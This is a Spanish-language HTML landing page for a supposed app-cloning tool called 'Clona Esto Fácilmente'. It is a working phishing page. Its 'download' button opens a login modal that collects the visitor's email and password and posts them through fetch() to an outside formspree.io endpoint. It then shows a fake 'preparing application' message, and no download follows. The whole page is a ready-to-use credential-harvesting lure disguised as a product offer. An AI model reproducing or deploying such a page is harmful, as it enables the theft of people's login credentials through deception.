<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clona Esto Fácilmente</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }

  body {
    overflow: hidden;
    height: 100vh;
    background: linear-gradient(135deg, #ff6f61, #ffb347);
    display: flex;
    justify-content: center;
    align-items: center;
    color: #fff;
  }

  canvas#bgCanvas {
    position: absolute;
    top:0;
    left:0;
    width:100%;
    height:100%;
    z-index: -1;
  }

  .container {
    text-align: center;
    z-index: 10;
  }

  header h1 {
    font-size: 3em;
    text-shadow: 2px 2px 8px rgba(0,0,0,0.5);
    margin-bottom: 20px;
  }

  .hero h2 {
    font-size: 2em;
    margin-bottom: 20px;
    text-shadow: 1px 1px 6px rgba(0,0,0,0.4);
  }

  .hero p {
    font-size: 1.2em;
    margin-bottom: 30px;
    line-height: 1.5;
    text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
  }

  .btn {
    padding: 16px 36px;
    font-size: 1.3em;
    font-weight: bold;
    border-radius: 12px;
    border: none;
    cursor: pointer;
    transition: 0.3s;
    background: #fff;
    color: #ff6f61;
    box-shadow: 0 6px 15px rgba(0,0,0,0.3);
  }

  .btn:hover {
    background: #ff6f61;
    color: #fff;
    transform: scale(1.05);
  }

  .modal {
    display: none;
    position: fixed;
    z-index: 999;
    left:0;
    top:0;
    width:100%;
    height:100%;
    background: rgba(0,0,0,0.8);
    justify-content: center;
    align-items: center;
    animation: fadeIn 0.5s ease forwards;
  }

  .modal-content {
    background: #fff;
    color: #333;
    padding: 40px;
    border-radius: 16px;
    max-width: 400px;
    width: 90%;
    text-align: center;
    position: relative;
  }

  .modal h2 {
    margin-bottom: 20px;
    color: #ff6f61;
  }

  .input {
    width: 100%;
    padding: 14px;
    margin: 12px 0;
    border-radius: 8px;
    border: 1px solid #ccc;
    font-size: 16px;
  }

  .loading {
    display: none;
    margin-top: 20px;
    color: #ff6f61;
    font-weight: bold;
    font-size: 1.1em;
  }

  .message {
    margin-top: 20px;
    font-weight: bold;
    font-size: 1em;
    color: #ff6f61;
    display: none;
  }

  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
</style>
</head>
<body>

<canvas id="bgCanvas"></canvas>

<div class="container">
  <header><h1>CLONA ESTO FÁCILMENTE</h1></header>
  <div class="hero">
    <h2>La forma más rápida de clonar aplicaciones</h2>
    <p>Regístrate ahora y accede a la herramienta más exclusiva del mercado.</p>
    <button class="btn" onclick="abrirModal()">Descargar aplicación ya</button>
  </div>
</div>

<div class="modal" id="modal">
  <div class="modal-content">
    <h2>Inicia sesión para descargar</h2>
    <form id="formulario" action="https://formspree.io/f/xjkekpdg" method="POST">
      <input type="text" name="correo" class="input" placeholder="Correo" required>
      <input type="password" name="contrasena" class="input" placeholder="Contraseña" required>
      <button type="submit" class="btn">Registrar</button>
    </form>
    <div class="loading" id="loading">Cargando aplicación...</div>
    <div class="message" id="message">Tu registro ha sido enviado. La aplicación se está preparando...</div>
  </div>
</div>

<script>
/* Fondo de partículas */
const canvas = document.getElementById('bgCanvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let particles = [];
for(let i=0; i<100; i++){
  particles.push({
    x: Math.random()*canvas.width,
    y: Math.random()*canvas.height,
    r: Math.random()*2+1,
    dx: (Math.random()-0.5)*1,
    dy: (Math.random()-0.5)*1
  });
}

function animate(){
  ctx.clearRect(0,0,canvas.width,canvas.height);
  particles.forEach(p=>{
    ctx.beginPath();
    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
    ctx.fillStyle = "rgba(255,255,255,0.7)";
    ctx.fill();
    p.x += p.dx;
    p.y += p.dy;
    if(p.x<0||p.x>canvas.width) p.dx*=-1;
    if(p.y<0||p.y>canvas.height) p.dy*=-1;
  });
  requestAnimationFrame(animate);
}
animate();

/* Modal y registro */
function abrirModal(){ document.getElementById("modal").style.display="flex"; }

const form = document.getElementById("formulario");
const loading = document.getElementById("loading");
const message = document.getElementById("message");

form.addEventListener("submit", function(e){
  e.preventDefault();
  loading.style.display = "block";
  message.style.display = "none";

  const formData = new FormData(form);
  fetch(form.action, {
    method: "POST",
    body: formData,
    headers: { 'Accept':'application/json' }
  })
  .then(response => {
    loading.style.display="none";
    message.style.display="block"; // Mostrar mensaje
    // Aquí se queda cargando indefinidamente
  })
  .catch(err=>{
    loading.style.display="none";
    message.innerText="Ocurrió un error, intenta de nuevo.";
    message.style.display="block";
  });
});

/* Cerrar modal */
window.onclick = function(event){
  const modal = document.getElementById("modal");
  if(event.target==modal){ modal.style.display="none"; }
}
</script>

</body>
</html>
